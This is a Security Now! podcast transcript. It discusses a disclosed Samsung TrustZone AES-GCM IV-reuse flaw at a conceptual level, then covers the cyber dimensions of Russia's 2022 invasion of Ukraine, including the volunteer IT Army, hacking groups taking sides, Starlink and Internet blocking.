I don't have it in the show notes, but in Samsung's API, they allow the caller of the API to provide the initialization vector.  And that allows you to call the API multiple times, providing the same initialization vector, thus forcing reuse against every rule of AES-GCM.  And so without breaking Samsung's rules because Samsung allowed the caller of their API to break the rules, it is possible to get this trusted execution environment to do things always with a fixed IV, and that results in well-known leakage problems for AES-GCM.



So now you can guess and understand the crucial and obvious mistake that Samsung's engineers made.  The Tel Aviv researchers wrote:  "ARM is the most widely used processor in the mobile and embedded markets, and it provides TEE hardware support with the ARM TrustZone.  TrustZone separates the device into two execution environments."  And again, as I said, it's because we have to.  We've just given up trying to make Android or Windows or anything else truly secure.  So let's just, you know, let's create a little enclave where we can be absolutely sure we do it right.  Unfortunately, Samsung did create an enclave.  They just didn't do it right at the enclave boundary.



So these two execution environments for ARM:  A non-secure REE (Rich Execution Environment), in other words Android, where the "Normal World" operating system runs; and a secure TEE (Trusted Execution Environment) where the "Secure World" operating system runs.  The REE and the TEE use separate resources - separate memory, separate peripherals - and the hardware enforces the protection of the Secure World, they wrote.



They said:  "In most mobile devices, the Android OS runs the nonsecure Normal World.  As for the Secure World, there are more choices.  Even among Samsung devices, there are at least three different TrustZone Operating Systems (TZOSes) in use."  They said:  "The Android Keystore provides hardware-backed cryptographic key management services through a Hardware Abstraction Layer that vendors such as Samsung implement.  The Keystore exposes an API to Android applications, including cryptographic key generation, secure key storage, and key usage," in other words, encryption and signing.



"Samsung implements the HAL through a Trusted Application called the Keymaster TA" - or Keymaster Trusted Application - "which runs in the TrustZone.  That Keymaster TA performs the cryptographic operations in the Secure World using hardware peripherals, including a cryptographic engine."  So cool; you know?  High tech, hardware enforced, everything you could possibly want.



"The Keymaster TA's secure key storage uses blobs."  And that's what I was talking about, blobs out in the normal file system.  They say:  "These are 'wrapped' encrypted keys that are stored on the REE's" - Rich Execution Environment, in other words Android - "file system.  The wrapping, unwrapping, and usage of the keys are done inside the Keymaster TA using a device-unique hardware AES key."  So per-device hardware never exposed to the outside world.  "Only the Keymaster TA should have access to the secret key material.  The Normal World should only see opaque key blobs.



"Although it is critical to rigorously verify and test such cryptographic designs, real-world TrustZone implementations receive relatively little attention in the literature."  They wrote:  "We believe that this is mainly due to the fact that most device vendors do not provide detailed documentation of their TZOS and proprietary TAs" - like Keymaster - "and share little to no information regarding how the sensitive data is protected.



"To advance and motivate this research area, we decided to use the leading Android vendor Samsung as a test case.  We reverse engineered the full cryptographic design and API of several generations of Samsung's Keymaster TA and asked the following questions:  Does the hardware-based key protection of cryptographic keys remain secure even when the Normal World is compromised?  How does the cryptographic design of this protection affect the security of various protocols that rely on its security?"



Okay.  And we know from the abstract at the top of their paper that their reverse engineering efforts paid off handsomely.  They were also, of course, responsible for their pre-disclosure to Samsung.  In that they wrote:  "We reported our IV reuse attack on S9 to Samsung Mobile Security in May of 2021.  Then three months later, in August 2021, Samsung assigned CVE-2021-25444 with high severity to the issue, and released a patch that prevents malicious IV reuse by removing the option to add a custom initialization vector from the API.  According to Samsung, the list of patched devices includes the S9, the J3 Top, J7 Top, J7 Duo, TabS4, Tab-A-S-Lite, A6 Plus, and A9S.



"Also we reported the downgrade attack on S10, S20, S21 in July of 2021.  Then three months later, in October 2021, Samsung assigned CVE-2021-25490 with high severity to the downgrade attack and patched models that were sold with Android P OS or later, including the S10, the S20, and S21.  The patch completely removes the legacy key blob implementation."



And finally, in their conclusion, they scolded much as I have, writing:  "Vendors including Samsung and Qualcomm maintain secrecy around their implementation and design of TZOSes and TAs.  As we have shown, there are dangerous pitfalls when dealing with cryptographic systems.  The design and implementation details should be well audited and reviewed by independent researchers and should not rely on the difficulty of reverse engineering proprietary systems."



In other words, this is classic Crypto 101.  As we know, the great breakthrough in cryptography came when we switched away from using proprietary and secret non-keyed encryption algorithms that just scrambled the bits in some magic way to using public and publicly scrutinized keyed cryptographic algorithms, making the algorithm public and the keys secret.  This same breakthrough principle must also be applied more deeply to the wider implementation and use of these now public algorithms.  Their implementation needs to be public just the same as the algorithm itself, that is, what you do with the algorithm obviously matters.  It's clear that the precise way these algorithms are used is every bit as important to the security of the entire system.  And thus the headline of their paper:  "Trust Dies in Darkness."  And as an industry we need to shine a light.



So I thought it was interesting that these guys are coming to the same conclusion, which is sure, you've got, you know, here's Samsung trading on beautiful, academically designed, seriously vetted algorithms, and then keeping what they do with them secret.  All these academics had to do was look at the fact that the AES-GCM was the algorithm being used, and maybe that wasn't obvious.  Maybe Samsung never says it.  They had to figure that out.



And once they did that, they realized, oh, my god, Samsung is letting users specify the initialization vector.  Why?  That should be designed, it should be obtained pseudorandomly, or maybe pure randomly because there's probably a high-quality hardware random number generator as part of this trusted execution environment.  So get a really long, completely unpredictable, never going to happen twice, initialization vector and have the TEE export it along with the result so that it can be provided later, rather than having the user provide it.  It's nuts.  You would never do that with AES-GCM, and Samsung did.



LEO:  Is this attack, can it be done through an app or over the air?



STEVE:  Yes.



LEO:  It can.



STEVE:  Yes.  All it would take would be to run an app which uses the trusted execution environment to exercise the keys for its own purposes.  So apps do absolutely have access to the security API in Android.  And so this would allow them to provide initialization vectors which would eventually leak the keying material that the whole point of this whole thing is to keep secret.  And it's a little worrisome that this problem has been around for so long, and they're only patching from P OS and later on S10, S20, and S21.  So once again we're in this problem of older Samsung devices that are no longer being maintained and no longer getting firmware updates, having what is now a well-known, fully documented, critical security flaw.



LEO:  So, yeah.  The S22 is not vulnerable, apparently, the newest Samsungs.



STEVE:  Yes.  They do stop at 21.



LEO:  Yeah.  Android Pie is three years old, Android 9.  And so there probably are a few older Samsungs that you can't update.  What should owners of, say, a Galaxy S4, 5, 6, 7, what should they do?  Should they be very careful about what they download, I guess, yeah?



STEVE:  Yeah, exactly.  It would be something that you get into your computer that would, I mean, this is classic state actor or classic NSS Pegasus.



LEO:  Oh, NSO Group.



STEVE:  NSO, exactly.



LEO:  So, okay.  So Grayson's mom, not being a dissident or journalist or opposition candidate, probably doesn't have to worry about the NSO Group.



STEVE:  No.  What this does not do is simply dump the key.  You've got to have something running, working, like doing encryption over and over and over and finding the biases in the...



LEO:  So this is a nontrivial exploit, then.



STEVE:  Yes.



LEO:  Okay.



STEVE:  It is a nontrivial exploit.



LEO:  So highly unlikely, in other words, as an average or normal user.  I mean, remember, phones weren't routinely encrypted until relatively recently.  I mean, I remember when you had to turn it on.  I think iPhones might have always been.



STEVE:  Remember that it used to slow things down.



LEO:  Yeah, you didn't want to turn it on.



STEVE:  So be like, oh, yeah, don't turn that on.  It'll slow down your phone.



LEO:  So this is no worse than that.  In fact, it's considerably better than that because if all your data's unencrypted, all a malicious actor would have to do is read the drive. 



STEVE:  I guess the only thing that I would say is that once upon a time we weren't doing things that assumed encryption.



LEO:  That's true.



STEVE:  If we didn't have it.



LEO:  Right.



STEVE:  And so we've gone so much further now.  We've got bitcoin wallets.  People have a bitcoin wallet in their phone.  And they're presuming that that stuff is going to be kept encrypted.



LEO:  Well, and that's a good point.  I mean, that is something that somebody might well be highly motivated to get to, yeah.



STEVE:  To get, yup.



LEO:  So that's, I mean, still requires some real sophistication, though.



STEVE:  The analogy would be that this provides a way to mine the phone's key.  It would be key mining.



LEO:  Key mining, yeah.



STEVE:  Is what this allows.



LEO:  All right.  So Grayson's mom has got it going on.  She's okay.  All right.  He was worried.  Grayson's a regular listener to the show.  So good news.  He's a good son, that Grayson.  So is Steve Gibson.  Who is Gib?  Whose son are you?  Is a guy named Gib?



STEVE:  Oh, Leo, he's long gone.  And I think he - hopefully he went to heaven because he was certainly not programming in assembly language.



LEO:  You've spent your time in hell already.  That is the man, the myth, the legend, Steve Gibson, still writing in x86 ASM.  In fact, that's how he wrote SpinRite, the world's finest mass storage recovery and maintenance utility.  6.0 is available at GRC.com, his website.  If you buy it today, you'll get an upgrade free to 6.1, and you can also participate in the development.



While you're there, you can also get a copy of this show.  There's 16Kb audio.  These are the two unique versions of the show that he has, the 16Kb for the bandwidth-impaired and really nice transcripts written by Elaine Farris.  She actually is a court transcriptionist, so she's writing it all down and putting it in a transcript.  All of that's at GRC.com.  While you're there, browse around.  There's all sorts of other stuff besides SpinRite.  It's a really fun site to take a look at.



You can also get a copy of the show at our website, TWiT.tv/sn.  Download audio or video from our site.  That's our unique version is the video.  There's also a YouTube channel dedicated to it.  You could subscribe in your favorite podcast player.



We are going to be back here at our regular time, 1:30 Pacific, 4:30 Eastern, 21:30 UTC, next Tuesday and every Tuesday.  Patch Tuesday this week, this coming week.  So join us if you want to want to watch the show live, live.twit.tv.  Chat live at irc.twit.tv or inside the Club TWiT Discord.  Thank you, Steve.  Have a great week.  See you next time.



STEVE:  Will do, my friend.  Stay cool, and see you on the 8th.



Copyright (c) 2022 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.






GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#861

DATE:		March 8, 2022

TITLE:		Rogue Nation Cyber Consequences

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-861.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we examine many of the cyber-consequences of Russia's unilateral aggression against Ukraine.  In a world as interconnected as today, can a rogue nation go it alone?  Ukraine has formed a volunteer IT Army.  Hacking groups are picking sides.  Is Starlink a hope?  Actors on both sides of Russia's borders are selectively blocking Internet content.  Google has become proactive.  The Namecheap registrar has withdrawn service.  Use of the Telegram encrypted messenger service has exploded.  Cryptocurrency exchanges block tens of thousands of wallets.  Russia releases the IP addresses and domains attacking them, and likely some which are not.  They also prepare to amend their laws to permit software piracy and appear to be preparing to entirely disconnect from the global Internet.  All of the technologies we've been talking about for years are in play.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Kind of a single topic show this week, everything Ukraine.  What's going on in the war, cyberwarfare, the call for cyber hackers, Russia's response, and then the very real prospect of Russia disconnecting completely from the Internet.  Steve talks about it all next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 861, recorded Tuesday, March 8th, 2022:  Rogue Nation Cyber Sequences.



It's time for Security Now!, the show where we cover your safety, security, and privacy online with this guy right here.  No, not this guy right here.  That's the Linux penguin.  This guy right here, Mr. GRC.com, Steve Gibson.  Hi, Steve.



STEVE GIBSON:  Yo, Leo.  Great to be with you again, once again.  Lorrie this morning asked me, she said, "What number is this?"



LEO:  She's counting down, isn't she.  I know, I know.



STEVE:  861.



LEO:  So she says, "Only 138 more?"



STEVE:  That's right.  We're going to make it.  We're going to make it.  And Leo, at only 52, actually 51 - oh, no, but we do count that one, so 52 a year - yeah, we've got a few years left.



LEO:  Yeah, couple and a half years, yeah, yeah.  We're good.



STEVE:  We're okay.  Okay.  So there was some interesting news about a proposal from the EU that involves mucking around with TLS certificates, and it's got all of the browser vendors up in arms.  And that's what I was going to talk about.  But all of the news, well, okay, with a few exceptions, the vast majority of the news was about the cyber consequences of what's happening with Russia and Ukraine.  So, and as I began to flesh that out and pull things together, I just thought, okay, I don't have room for anything else.  So we'll probably talk about that next week when I dig into it and see whether it's podcast-worthy.



Today's Episode 861 for March 8th is titled "Rogue Nation Cyber Consequences."  And I think a lot of really interesting cyber aspects to what's happening.  We've got the Ukraine - I'm sorry, Ukraine.  I'm trying to educate myself.  We're not supposed to say "the" anymore.  That's an old way to do it.  Ukraine has formed an IT army with amazing strength.  And sort of the theme of this is, with the world as interconnected as it is today, can a rogue nation go it alone?  We're seeing lots of consequences of what's happening as a result of this.  As I said, we've got the IT army.  We've got hacking groups, many of them well known, forming up and picking sides in this.  The question is whether Elon Musk's Starlink might be a hope where connectivity is being threatened.



Actors on both sides of Russia's borders and, well, yeah, both sides of Russia's borders are selectively blocking Internet content.  Google has become proactive now.  One domain registrar, Namecheap, has decided to withdraw its services in a way that I find a little questionable we'll talk about.  We also have the surprising, well, maybe not that surprising, explosion of the Telegram encrypted messenger usage as a consequence of all this.  Cryptocurrency exchanges are blocking tens of thousands of wallets.  Russia's released the IP addresses and domains attacking them, and it looks like some that are probably not actually doing that.



They're also preparing, believe it or not, well, yeah, you can believe it, to amend their laws to permit software piracy.  And they appear to be preparing to entirely disconnect from the global Internet, something that we talked about last summer when they did a DNS dry run.  So this is all the stuff we've been talking about for years.  Everything's in play.  So lots of news to talk about relative to the cyber consequences of someone upsetting the rest of the world.  Is it possible these days to be on your own?  I don't think so.



LEO:  Yeah, I think it's interesting.  We talked - Cory Doctorow was on TWiT on Sunday, and we talked about why it would be a very bad idea for ICANN to disconnect, as at least one Ukraine minister requested, disconnect Russia from the Internet.  That's not how it works.  So, yeah, good topic coming up.  Certainly very timely. 



STEVE:  Okay.  So our Picture of the Week is just one I've had, it's not apropos of today's topic, it was just around, and it's kind of fun.  And I just thought it was interesting how the laptop is now the icon for the computer.  You know, once upon a time it was staring into a big screen in front of you.  But you never see that anymore; right?  It's just people use laptops.  That's just - anyway, just random observation.



But anyway, so our guy, he's got his wife behind him sort of like with her hand on his chair back and looking on at what he's doing.  And he's saying to her as he's typing on the laptop:  "Of course this website is safe.  As an extra measure of security, they make you sign in with your Social Security number, mother's maiden name, your bank account, your home address, phone number, and date of birth."



LEO:  It's got to be you.



STEVE:  Nobody else would know that.



LEO:  Well, not until I do it, yeah.



STEVE:  Okay.  So unsurprisingly, as I said at the top of the show, the world cyber news this past week was dominated by the cyber aspects of Russia's invasion of Ukraine.  We've been living through, and this TWiT podcast network has documented and chronicled important and fascinating aspects of the evolution of the personal computer and the Internet.  When I think back, Leo, to where we were with Honey Monkeys, you know, almost 18 years ago, it's like, okay, a lot has changed.  HTTP was a thing, right, with no S.  Now, good luck if you don't have an S there.



And I have to admit that when this podcast, Security Now!, began, I was personally skeptical of the idea of cyberwarfare.  It just, like, really?  Like packets?  Well, obviously since then I've been well disabused of any such skepticism.  And I've been interested to note that in the last few weeks all the experts, because cyberwarfare is a topic now, like any time there's a discussion of what's going on, it's like, oh, this threat of cyberwarfare.  And the presumption is that it would not be constrained to Russia and Ukraine.  It would be global to some degree.



But the point is that all the experts that I'm hearing talk about it feel much as I do, which is that it's something no one is really that excited to unleash, very much like the Cold War days of mutually assured destruction.  As I said last week, the feeling is that no one has any real confidence in their own defenses being adequate.  So nobody wants to be the first to initiate what - whoa.  I forgot to turn that down, our little friend telling me I've got email, sorry.



No one's that confident about their own defenses being adequate, so no one wants to be the first to initiate what might be mutually assured cyber destruction.  We don't even know what that looks like.  And nobody wants to find out.  Yet here we are today kind of picking around the edges of exactly that possibility, such that more than any other time in the past it's on everyone's lips.



Okay.  So I'm not going to spend an inordinate amount of time on any one of these topics.  But literally, as I was going through the last week's what is there to talk about, it was all about this.  It was all about the consequences of this.  So Saturday before last, on the 26th, Ukraine's Minister of Digital Transformation, whose name we'll hear of a few times today, Mykhailo Fedorov, announced the creation of an army of IT specialists to fight for Ukraine in cyberspace.  Mykhailo said:  "We have many talented Ukrainians in tech:  developers, cyber-specialists, designers, copywriters, marketing specialists, targeting specialists."  Wow, targeting specialists.  And he said:  "We are creating an IT Army.  All operational tasks will be posted here.  There's plenty to do for everyone.  We continue our fight at the cyber-front."



So of course being that he's their digital transformation guy, his focus is that.  Anyway, turns out that Mykhailo's call did not go unheeded.  When I captured this particular report, the number of volunteers that had signed up, and we'll see that by the time we end this podcast that number has grown, at this point it was already 175,000 people had said yeah, I want to, you know, sign me up.



LEO:  What?



STEVE:  175,000.



LEO:  Wow.  I didn't know there were that many people with skills.



STEVE:  Well, and they said copywriters, marketing specialists.



LEO:  Oh, all right.  Okay.



STEVE:  So, you know, like you don't have to actually know how to sharpen the front edge of a packet in order to send it off. 



LEO:  Wow.



STEVE:  You just have to know what that packet should contain, I guess, if it was some propaganda or something.



LEO:  They're going to need some IT specialists to manage the database of volunteers.



STEVE:  That's right.



LEO:  Is what they're going to need.



STEVE:  That's right.  So he said:  "Many have been tasked with launching DDoS attacks against Russian websites including government websites, banks, and energy companies.  On the 27th, the day after this, officials also told volunteers to target websites registered in Belarus."  Mykhailo also publicly released the targeting list.  Okay?  So this is the IT Army of Ukraine.  It says:  "For all IT specialists from other countries, we translated tasks in English."  So, he says:  "Task #1.  We encourage you to use any vectors of cyber and DDoS attacks on these resources."



So, I mean, this is a publicly posted list from Ukraine.  So we've got three categories:  business corporations, banks, and the state.  So, for example, business corporations:  Gazprom, I can't even pronounce these things.  I won't try.  But there's like [counting aloud] 19 specific business corporations where their URL, and I think without exception, oh, there is a .com.  By far the most are .ru, of course.  Though there are some - there's a .org.  Predominantly .ru.  Then we've got three banks:  the Sberbank, VTB, and Gazprombank.  And then the third category is the state.  There's public services; Moscow State Services; President of the Russian Federation; Government of the Russian  Federation; Ministry of Defense; Tax, whatever that is; Customs; Pension Fund; and our favorite Roskomnadzor is also there.



So, I mean, obviously they're being put upon, that is, Ukraine is.  And they're saying, hey, cyber is now a vector of counterattack.  So let's go.  And here's your initial targeting list.  Yikes.  An open call for anyone and everyone to participate.  But let's be clear that the perceived justice, if that's how you feel, of this cause doesn't make it legal.  Right?  So people listening, you know, don't go off attacking Russia because some guy in Ukraine said, yeah, here's where you go.  Don't do that.



According to Victor Zhora, an official at the Ukrainian cybersecurity agency charged with protecting government networks, he said:  "Russian media outlets that are 'constantly lying to their citizens,' and financial and transportation organizations supporting the war effort, are among the potential targets for digital attacks from the so-called Ukrainian IT army."  He said that the IT army is a loose band of Ukrainian citizens and foreigners that are not part of the Ukrainian government, but Kyiv is encouraging them.  It's an example of how the Ukrainian government is pulling out all the stops to try to slow Russia's military assault, and illustrates how cyberattacks have played a supporting role in the war.



The goal of this IT Army of Ukraine is to "do everything possible to make the aggressor feel uncomfortable with their actions in cyberspace and in Ukrainian land."  And so this was Victor Zhora in a videoconference with journalists on Friday.  And I will say, because I've just gone through this myself, assembling the 17-page notes for this podcast, if you follow along, by the end of this podcast I would argue you will have a very mature, complete, almost comprehensive, I dare say, appreciation for everything that is going on, like everywhere on this.  It's what we're here to talk about.



So one organization, the so-called Cyber Unit Technologies, the CUT, is paying for attacks on Russia.  Given what we've been seeing in the news, it's unclear actually why you would need to give any Ukrainian hacker a bounty to encourage them to launch  cyberattacks against Russia.  Just making it legal is all I would need, I would imagine.  But last Tuesday, a week ago, the Kyiv-based cybersecurity firm Cyber Unit Technologies initiated a campaign to reward hackers for taking down Russian websites, pledging an initial $100,000 for the program.



Although, as we'll see next, many traditional criminal gangs have publicly expressed their allegiances either way, this CUT emphasized that the company only seeks to work with locally known security experts, they said to prevent infiltration by Russian agents.  And actually they referred to them as "white hat hackers."  And that gave me pause because I'm thinking, okay, wait a minute.  I'm not sure that your hat stays white  when you attack anybody else.  Again, no matter how you feel about it, that sort of seems like your hat's going to get at least a little gray in the process.



But if such hackers already had mature tools that they had been using for sanctioned, you know, we've talked about red, blue, and purple teaming; right?  You know, all of the attack and counterattack, in order to build up through drills and exercises the skills that you need both to predominantly to defend against attacks, but you need to have somebody attacking you; right?  So you use a team to do that.  They might well be able to retarget those tools which have been sharpened as a consequence of doing local drills.  And you kind of have to imagine that Ukraine, being as much in Russia's cyber cross-hairs as they have been for the past 20 years, that they've had the occasion to develop and hone such tools over time.



So this is probably the reason why NATO's - NATO has an organization known as CCDCOE.  Everybody likes their abbreviations.  That's the Cooperative Cyber Defense Centre of Excellence which has, just as a result of its 30th committee meeting, invited Ukraine to become involved as a participant in this Cooperative Cyber Defense Centre of Excellence.  It is a NATO organization.  Ukraine of course is famously not a member of NATO.  But yet they're going to be invited in because they have so much expertise that they're going to be able to share.



So, okay.  Hackers taking sides.  As a result of Russia's determination to unilaterally and by sheer force attempt to illegally annex Ukraine as they previously did Crimea, we have the world's well-known hacking groups now squaring off and taking publicly declared sides for and against.  Last Friday, Recorded Future's publication The Record described the declarations on both sides as follows.



They said:  "Russia's invasion of Ukraine has taken place both on and offline, blending physical devastation with escalating digital warfare.  Ransomware gangs and other hacking groups have taken to social media to announce where their allegiances lie.  The Record will be tracking who these groups align with, as well as any attacks they launch related to the conflict.  Many of the pronouncements from these groups include threats against critical government infrastructure.  Some collectives are state-sponsored, while others are decentralized; but all are able to take down computer systems and breach organizations."



Allan Liska, a ransomware expert at Recorded Future, said:  "It is now an inevitable part of any military action that so-called 'Cyber Patriots' will engage the perceived enemy, either of their own free will or at the direction of their own government.  Some of these activities, such as Anonymous launching DDoS attacks, will be nothing more than minor nuisances; but others could have real consequences.  Ransomware groups, for example, have more targets than they can go after right now and may decide to focus on attacking the enemies of their country to create real disruption.  And the more skilled groups can have an even greater impact."  Liska warned that Sandworm and UNC1151 are among the most concerning in terms of their capabilities and activity, and should be closely monitored.



Okay.  So what do we know at the moment about who's on which side of this mess?  Well, the well-known collective "Anonymous" declared via Twitter on February 24th that its collective is "officially in a cyber war against the Russian government."  The group later tweeted that they had targeted the Russian state-controlled international television network RT, and "has taken down the website of the Russian propaganda station RT News."



Now, we've talked about Anonymous.  Everyone is probably familiar with that logo that they use.  They describe themselves as a "decentralized hacktivist group that targets different government institutions and government agencies, corporations, and the Church of Scientology."  Okay.  There's also GNG, a hacking group affiliated with Anonymous.  They've gained access to Sberbank's database and leaked hundreds of its data files.  Sberbank, who is Russia's largest lender, is apparently now facing failure.



NB65 is another affiliate of Anonymous who tweeted their support for Ukraine:  "Anonymous is not alone.  NB65 has officially declared cyber war on Russia, as well.  You want to invade Ukraine?  Good.  Face resistance from the entire world.  #UkraineWar  All of us are watching.  All of us are fighting."



And also, as of February 28th, another group under the Anonymous umbrella named DeepNetAnon has joined in the operations against Russia by attacking and intercepting Russian radio receivers.  The group tweeted:  "The Russians have now taken offline the second web server hosting a Software-Defined Radio receiver, used to intercept with radio frequencies.  Too bad there's many more sites we can use."



The collective also announced that they have successfully hacked the Ministry of Economic Development of Russia.  The group 1LevelCrew also showed their support for Ukraine and tweeted, "TANGO DOWN," and then a URL, http://pfr.gov.ru.  And that was actually one of the targets that the IT Army had been assigned.  That's the Pension Fund of Russia, which they tweeted as a result of this TANGO DOWN is offline.  Another collective known as HydraUG made a clear statement via Twitter, saying:  "I'm not here to deface/destroy your website, I'm here to liberate Ukraine."



As of last Wednesday, another affiliate named N3UR0515, maybe that's neuro, probably neuro something or other, took to Twitter to declare support and call on YouTube to take down Russian propaganda.  We'll be talking a little bit later about Google's moves along those lines.  The group has administered DDoS attacks and taken down RIA.ru, the official Russian information website.  Joining the Anonymous collective, VogelSec announced that they had hacked into the Russian Space Research Institute database and leaked files from Roscosmos, though the hack has not yet been confirmed.



Ghostsec announced their support for Ukraine, saying:  "In support of the people in Ukraine, we stand by you."  Also known as Ghost Security, the group considers itself a vigilante group and was initially formed to target ISIS websites that preach Islamic extremism.  Ghostsec is also commonly referred to as an offshoot of Anonymous.



Then we have AgainstTheWest (ATW).  They, while they're against the West, are standing with Ukraine.  The group's Twitter account says:  "We are back in action, standing against Russia, active until Russia stands down."  The group's actively working to breach Russian infrastructure, including Russian railways and Russian government contractor promen48.ru.  On March 1st the group issued a new statement for further clarification.  Actually it's a little waffling.



They said:  "We won't be collaborating with Anonymous.  ATW - remember, that's Against The West - will be splitting into two groups, one for Russia-related breaches, one for Chinese-related," the group stated.  ATW accused Anonymous of taking the credit for the work they had done, saying:  "Anonymous has had a lot of media publicity over the years for hacking; and to see this, it didn't sit right," referring to some credit that Anonymous took.  They said:  "ATW appears to have been suspended from Twitter as of last Thursday, March 3rd."  So again, like I said, this stuff is not all legal, folks.



SHDWSec joins the movement to support Ukraine.  The group is working in collaboration with ATW and Anonymous in operations against Russia.  And they tweeted:  "SHDWSec joined forces with AgainstTheWest.  First stage is now on the roll.  Expecting us is too late.  Brace for impact.  More to come."



LEO:  Oh, lord.  These are 12 year olds.  Come on.



STEVE:  I think a lot of that, yes, you're right.  Some of these guys it's clear are that.  I'll skip over some of these.  We have the Belarusian Cyber Partisans supporting Ukraine.  We have KelvinSecurity announcing they stand with Ukraine.  Raidforums2 also stands with Ukraine.  The group announced:  "Raidforums2 is in support of Ukraine.  Members are actively DDOSing Russian websites and attacking Russian infrastructure.  We also have reason to believe the Chinese are hacking Ukrainian networks," though they didn't support that accusation.  "Previously labeled as only Raidforum, the collective is now operating as Raidforums2 after having outage and access issues."  Yeah.  Maybe a counterattack.  It's unclear what went wrong with the original Raidforum.



However, ContiLeaks is significant.  Definitely not Conti.  We'll get to them a little bit more in a minute.  But they also back Ukraine.  The group has exposed the infamous ransomware group Conti from the inside out.  Following February 27th, Conti's statement of full Russian support, an account named ContiLeaks leaked hundreds of files containing internal Conti communications.  The informant is believed to be Ukrainian and has continued to leak more and more files as days have gone by.  More recent data shows communication depicting the chaos within Conti where, for example, one person says:  "Hi, all VM farms are cleared and deleted, servers are disabled."  And then somebody responds:  "I deleted all the farms with the shredder and shut down the servers."  So hacker speak.



Okay.  So and of course we also have Conti, which is in full support of Russia.  Emsisoft's ransomware expert Brett Callow shared a tweet from the Conti gang.  They said:  "If anybody will decide to organize a cyberattack or any war activities against Russia, we are going to use all our possible resources to strike back at the critical infrastructures of an enemy."  And of course, as we know, the Conti ransomware gang is certainly one to be reckoned with.  They are very sophisticated and known for being the first group to weaponize the Log4Shell vulnerability and operate a fully deployed attack chain.



But it appears that not everyone within Conti shared the group's loyalty to Mother Russia.  As I mentioned, this what was their name, ContiLeaks, ContiLeaks group leaked 400 files of internal communications between members of the group.  The leaked messages go back more than a year to January of 2021.  The data was shared with the malware research group VX-Underground, who have since posted an archive of all the leaked data on their site.  I have a link to it in the show notes, after having taken a look at it last evening, and I tweeted the link because I thought it might be of interest to some of our listeners.  It looks like a legitimate source of Conti-leaked information, though obviously treat it with skepticism.



There is, oh, and this is one that The Record had referred to, a Minsk-based group, UNC1151, in support of Russia.  They're believed to be a state-sponsored by Belarus group, and they've already been working to compromise the email accounts of Ukraine military personnel.  The group's members are officers of the Ministry of Defense of the Republic of Belarus.  Facebook has taken down accounts used by UNC1151 which targeted Ukrainian officials through Facebook posts that displayed videos depicting Ukrainian soldiers as weak.  Facebook also blocked various phishing domains that were being used to jeopardize Ukrainian accounts.



We also have Zatoichi is supporting Russia through the spread of disinformation via the group's Twitter account.  Among many of their claims, the account stated:  "Killnet has already taken down the Anonymous website, which announced the start of a cyber war with the Russian government, as well as the Right Sector website, and the website of the President of Ukraine."  And again, that's not true.  And speaking of Killnet, they also clearly stand with Russia.  The group published a video addressing the people of Russia, encouraging them to never doubt their country.  The video features a hooded figure with a distorted voice claiming to have taken down the website belonging to Anonymous.  Again, it's not down.  Little is known about the group, and it's unclear as to whether the group existed previously.



There's also, and I'll skip details of the rest of these since it goes on and on:  XakNet backing Russia, the Stormous Ransomware collective standing with Russia, Digital Cobra Gang.  FreeCivilian united with Russia.  Sandworm, that is a serious group.  The group known for its recent malware called Cyclops Blink is comprised of Russia state-sponsored hackers.  They've been around for a while - we've spoken of Sandworm on the podcast before - and have malware which targets WatchGuard Firebox firewalls.



We've got the Red Bandits, a cute name, and the CoomingProject.  An international hacker group announced in a statement:  "Hello, everyone.  This is a message we will help the Russian government if cyberattacks and conduct against Russia."  So broken English.  They're linked to the 2021 data breach and leak of the South African National Space Agency.  So all this going on with the groups declaring for and against, and it does seem clear, if we are to believe the tweets of those who have said they are going to attack Russia and then providing details that there is a lot of activity aimed in that direction.



Starlink.  We know what Starlink is.  It's Elon Musk's low Earth orbit satellite technology.  I've got one very good friend, Mark  Thompson, who's in an area in Phoenix where, believe or not, he doesn't have any broadband Internet service.  And he's hoping that this is all going to work out well.



This Ukraine Minister of Digital Transformation, I think he's 31 years old, he looks young, Mykhailo Fedorov.  On the 26th he tweeted to @elonmusk.  He said:  "@elonmusk  While you try to colonize Mars, Russia tries to occupy Ukraine.  While your rockets successfully land from space, Russian rockets attack Ukrainian civil people.  We ask you to provide Ukraine with Starlink stations and to address sane Russians to stand."  To his credit, Elon replied:  "Starlink service is now active in Ukraine."  It hadn't been a day before.  And, he said:  "More terminals en route."



Okay.  Although so far Ukraine's Internet access has been relatively stable, and it's actually been surprising people, concerns over the possibility of widespread outages, as Russia has been increasingly attacking communications infrastructure, have recently increased.  So it was with some sense of relief that an equipment truck arrived from Starlink, like that day, which of course is the Internet subsidiary of Elon Musk's SpaceX.



So will it be helpful?  Was it another PR stunt for which of course Elon is rather famous?  It's too soon to say.  But it would take more trucks, many more trucks, in order to make a significant difference.  According to Ukraine's Ministry of Digital Transformation, only one truck of Starlink kits has arrived so far.  The Ministry is raising funds to purchase additional Starlink equipment, according to Forbes Ukraine.  Ukraine is also considering the purchase of used Starlink devices, if they can get them.  According to Business Insider, a standard Starlink kit costs $500, with a subscription to the network costing $99, presumably that's per month.



Anyway, so the system appears to be helping some Ukrainians to stay connected.  The general stability of the Ukrainian Internet service should, and in general has been, allowing Ukraine's president and other citizens to stay in contact with the outside world and keep everyone updated about what's going on.  But Internet connectivity has been affected in the south and eastern regions of the country where the fighting has been the heaviest.  Ukrainian officials stated that Russia would not be able to switch off Internet access easily for the entire country.



And it turns out that Ukraine's multiple land fiber connections which come in from the West makes it more difficult to take Ukraine off the 'Net as a whole.  So they've been able to stay online so far.  Still, many Ukrainians fear that they would be cut off from the world if Russian troops were to destroy the critical infrastructure responsible for television and the Internet.  We had an Internet outage briefly yesterday, and it is amazing how much we've come to be dependent and to take for granted the connectivity that we have with the world.  



Control of the Internet and telephone communications is obviously of immensely important strategic value.  Ukraine has limited the Russian troops' access to networks by having its phone carriers  Kyivstar, Vodafone, and Lifecell  shut down network access to phones from Russia and Belarus.  So troops from those countries will be unable to send messages and spread false information via phone calls.  And obviously just thwarting your enemy's communications is good policy.



